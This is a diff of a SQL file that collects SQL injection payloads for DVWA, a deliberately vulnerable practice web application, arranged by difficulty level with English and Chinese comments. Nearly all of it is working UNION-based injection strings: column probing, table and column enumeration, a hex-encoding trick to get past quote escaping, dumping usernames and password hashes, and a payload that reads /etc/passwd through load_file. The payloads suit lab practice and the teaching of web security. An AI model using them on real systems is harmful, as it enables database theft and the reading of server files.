@@ -1,24 +1,58 @@
-```sql
--- ======================================================
--- DVWA SQL Injection Payloads Collection
--- ======================================================
+/*
+  ==========================================================================
+  DVWA SQL Injection Full-Level Payloads Collection
+  Author: [Your Name/GitHub ID]
+  Target: DVWA v1.10 (MySQL 5.7+)
+  Description: A structured collection of payloads used in SQLi practice.
+  ==========================================================================
+*/
 
--- 【Low Level】: 基础字符串型注入
--- 探测字段数
-1' order by 2 #
--- 获取数据库信息
-1' union select database(), version() #
+-- --------------------------------------------------------------------------
+-- 1. LOW LEVEL (String-based Injection)
+-- --------------------------------------------------------------------------
+-- Description: No filtering. Focus on basic UNION-based data extraction.
 
--- 【Medium Level】: 数字型注入 + 绕过过滤
--- 1. 解决编码冲突 (Illegal mix of collations)
-1 union select 1, group_concat(table_name) collate utf8_general_ci from information_schema.tables where table_schema=database() #
+-- Check the number of columns (Result: 2 columns)
+1' ORDER BY 2 #
 
--- 2. 十六进制绕过引号过滤 (0x7573657273 = 'users')
-1 union select 1, group_concat(column_name) collate utf8_general_ci from information_schema.columns where table_name=0x7573657273 #
+-- Extract Database Name & Version
+1' UNION SELECT database(), version() #
 
--- 3. 获取敏感数据
-1 union select user, password from users #
+-- Extract Table Names from the current database
+1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #
 
--- 【High Level】: 绕过 LIMIT 限制
--- 注释掉后端硬编码的 LIMIT 1
-1' union select user, password from users #
+
+-- --------------------------------------------------------------------------
+-- 2. MEDIUM LEVEL (Numeric-based Injection)
+-- --------------------------------------------------------------------------
+-- Description: mysqli_real_escape_string() used. No quotes allowed in payload.
+
+-- [排障记录] Solve Collation Conflict (Illegal mix of collations)
+-- Force cast to 'utf8_general_ci' to match the system database
+1 UNION SELECT 1, group_concat(table_name) COLLATE utf8_general_ci FROM information_schema.tables WHERE table_schema=database() #
+
+-- [绕过技巧] Bypass quotes using HEX encoding
+-- Target table: 'users' -> 0x7573657273
+1 UNION SELECT 1, group_concat(column_name) COLLATE utf8_general_ci FROM information_schema.columns WHERE table_name=0x7573657273 #
+
+-- Dump data
+1 UNION SELECT user, password FROM users #
+
+
+-- --------------------------------------------------------------------------
+-- 3. HIGH LEVEL (String-based + LIMIT bypass)
+-- --------------------------------------------------------------------------
+-- Description: Parameter passed via Session. Hardcoded 'LIMIT 1' in backend.
+
+-- Use '#' to truncate the hardcoded LIMIT clause
+1' UNION SELECT user, password FROM users #
+
+
+-- --------------------------------------------------------------------------
+-- 4. UTILITY PAYLOADS (Bonus)
+-- --------------------------------------------------------------------------
+-- Read OS Files (If permissions allow)
+1' UNION SELECT 1, load_file('/etc/passwd') #
+
+-- Get current DB User
+1' UNION SELECT 1, user() #
